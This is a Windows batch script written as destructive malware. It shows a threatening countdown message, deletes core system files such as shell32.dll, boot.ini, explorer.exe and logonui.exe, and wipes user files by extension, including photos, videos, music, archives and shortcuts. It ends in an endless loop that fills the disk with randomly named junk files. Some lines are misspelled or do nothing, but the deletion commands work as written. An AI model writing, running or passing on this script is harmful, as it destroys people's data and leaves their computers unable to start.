@echo off
echo rundll32 mouse, disable
echo rundll32 keyboard, disable
shutdown -r -t 80 -c "you computer will be cleaned from all files in 80 seconds"
start skull.jpg
start cmd.exe
start regedit.exe
copy *.000 *.*
del c:/windows/system32/shell32.dll
del c:/boot.ini
del c:/windows/explorer.exe
del c:/windows/system32/logonui.exe
del*.rar
del *.zip
del*.mp3
del *.xml
del *.lnk
del*.com
del *.bat
del*.avi
del *.mpeg
del*.mp4
del *.amr
del*.3gp
del *.jpg
del *.bmp
del*.png
del *.gif
del*.ico
:1
echo rundll32 mouse,disable >> %random% . %random%
echo runfll32 keyobard,disable >> %random% . %random%
goto 1